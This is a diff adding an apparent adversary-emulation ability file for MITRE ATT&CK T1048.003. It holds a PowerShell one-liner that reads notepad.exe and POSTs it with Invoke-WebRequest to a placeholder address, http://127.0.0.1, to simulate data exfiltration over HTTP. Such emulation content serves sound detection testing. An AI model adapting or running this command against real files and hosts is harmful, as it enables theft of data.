@@ -1,0 +1,24 @@
+- description: 'Exfiltration of specified file over HTTP.
+
+    Upon successful execution, powershell will invoke web request using POST method
+    to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results
+    will be via stdout.
+
+    '
+  id: 548a620b-f346-3f72-a429-37faf7614935
+  name: Exfiltration Over Alternative Protocol - HTTP
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $content = Get-Content C:\Windows\System32\notepad.exe; Invoke-WebRequest
+          -Uri http://127.0.0.1 -Method POST -Body $content
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
+      Non-C2 Protocol'
